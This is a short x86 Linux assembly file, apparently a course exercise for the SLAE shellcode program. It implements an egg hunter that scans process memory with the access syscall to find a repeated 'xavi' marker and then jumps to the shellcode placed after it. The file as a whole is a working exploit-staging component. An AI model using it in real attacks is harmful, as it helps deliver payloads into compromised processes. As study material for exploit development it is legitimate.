; Filename: egg_hunter.nasm
; Author:  Xavier Beltran
; Course: SLAE - Pentester Academy
; EGG = xavi =  0x78617669

global _start

section .text
_start:

next_page: 
	or dx, 0xfff

next_address:
	inc edx 
	mov ebx, edx
	xor eax, eax
	mov al, 0x21
	int 0x80

	; Verify if SYS_ACCESS returned an EFAULT
	cmp al, 0xf2
	jz next_page

	; Verify if we found the EGG
	cmp dword [edx], 0x69766178
	jnz next_address
	cmp dword [edx + 0x4], 0x69766178
  	jnz next_address

	; JMP to the shellcode
	lea edx, [edx+8]
	jmp edx
